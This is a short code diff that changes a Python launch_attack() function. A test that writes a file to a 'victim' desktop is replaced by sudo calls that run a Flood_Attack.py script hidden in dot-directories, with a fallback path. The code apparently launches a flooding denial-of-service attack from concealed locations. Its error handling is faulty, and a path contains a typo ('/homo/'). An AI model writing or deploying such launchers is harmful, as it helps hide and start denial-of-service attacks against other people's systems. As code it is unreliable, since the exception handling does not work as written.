@@ -1,14 +1,16 @@
 import os
-# from Check_Attack import check_attack
 
 
 def launch_attack():
-    os.system('sudo mkdir /home/victim/Desktop/Launch attack')
-    fo = open('/home/victim/Desktop/Launch attack/test.txt')
+    try:
+        os.system('sudo /usr/bin/python /homo/victim/.etc/.module/Flood_Attack.py')
+    except OSError as e:
+        print(e)
 
-    fo.write('hey')
-
-    fo.close()
+        try:
+            os.system('sudo /usr/bin/python /homo/victim/.var/.module/Flood_Attack.py')
+        except OSError as e:
+            print(e)
 
     return
 
